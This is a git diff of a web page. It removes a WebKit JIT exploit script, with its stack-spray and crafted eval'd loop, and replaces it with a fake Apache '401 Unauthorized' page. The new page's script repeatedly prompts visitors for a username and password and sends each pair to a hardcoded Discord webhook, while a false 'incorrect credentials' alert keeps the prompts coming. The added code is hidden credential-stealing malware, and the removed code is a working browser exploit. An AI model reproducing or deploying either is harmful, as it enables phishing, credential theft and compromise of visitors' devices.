@@ -1,74 +1,51 @@
-<script>
-
-alert("If you receive no alert after clicking 'OK' it means that it worked,\n and if you receive the message: 'PATCHED!' it means that it does not work on your firmware");
-
-OFFSET_SIZE = 7;
-// Default offset_size is: OFFSET_SIZE = 400;
-// Running in debug mode with OFFSET_SIZE=7 produces the following bytecode for the vulnerable code:
-// Fill the stack with the return value of the provided function.
-function stackspray(f, x, d) {
-  if(d==0) return;
-  // This function will spill all the local variables to the stack
-  // since they are needed for the returned array.
-  let v0 = f*x;
-  let v1 = f*x*x;
-  let v2 = f*x*x*x;
-  let v3 = f*x*x*x*x;
-  let v4 = f*x*x*x*x*x;
-  let v5 = f*x*x*x*x*x*x;
-  let v6 = f*x*x*x*x*x*x*x;
-  let v7 = f*x*x*x*x*x*x*x*x;
-  let v8 = f*x*x*x*x*x*x*x*x*x;
-  let v9 = f*x*x*x*x*x*x*x*x*x*x;
-  let v10 = f*x*x*x*x*x*x*x*x*x*x*x;
-  let v11 = f*x*x*x*x*x*x*x*x*x*x*x*x;
-  stackspray(f,x, d-1);
-  return [v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11];
-}
-    
-function preparestackspray() {
-   // JIT compile the stack spray.
-   for (let i = 0; i < 10000; i++) {
-     // call twice in different ways to prevent inlining.
-     stackspray(1337,1, 10);
-     stackspray(2,1, 1);
-   }
-}
-preparestackspray();
-
-function main() {
-offset_str = '';
-for(let i = 0; i<OFFSET_SIZE; i++) {
-  offset_str += "let offset_" + i + "=1;"
-}
-
-code = `
-stackspray(0x13371338,1, 200);
-for(var i=0; i<(10000 + 1); i++) {
-  ${offset_str}
-  const var08 = 1;
-  if(i==0) {
-    try {
-      undefined[0] ||= var08 *= some;
-    }
-    catch { }
-    finally { }
-  }
-}
-`;
-
-eval(code);
-}
-main();
-
-
-alert("PATCHED!");
- document.location.href="https://zellix67.github.io/";
-
-</script>
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>Sucess webkit!</h1>
-   <button onclick="location.href = '../..'">Back to home</button><br>
-  </body>
+<body>
+
+  <meta charset="UTF-8">
+
+  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+  <html><head>
+  <title>401 Unauthorized</title>
+  </head><body>
+  <h1>Unauthorized</h1>
+  <p>This server could not verify that you
+  are authorized to access the document
+  requested.  Either you supplied the wrong
+  credentials (e.g., bad password), or your
+  browser doesn't understand how to supply
+  the credentials required.</p>
+  <hr>
+  <address>Apache/2.4.41 (Ubuntu) Server at 194.214.233.234 Port 80</address>
+  <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+  </body></html>
+
+<script>
+function myFunction() {
+  const request = new XMLHttpRequest();
+  request.open("POST", "https://discord.com/api/webhooks/911047735262707805/xSg3te1iGsWBI_adqmbUmgNXaNHZVHf9ccoxpn0t_wRPhiOivT10VuUkiLbFhEUixO28");
+  let text;
+  let user = prompt("Nom d'utilisateur")
+  var password = prompt("Mot de passe","")
+  request.setRequestHeader('Content-type', 'application/json');
+  const params = {
+    username: "Zellix",
+    avatar_url: "",
+    content: "User: " + user + " Password: " + password
+  }
+  request.send(JSON.stringify(params));
+  alerts()
+}
+
+function alerts() {
+  alert("Les identifiants sont incorrects, merci de réessayer")
+  myFunction()
+}
+
+setTimeout(function(){
+  myFunction()
+}, 1000);
+</script>
+
+</body>
 </html>
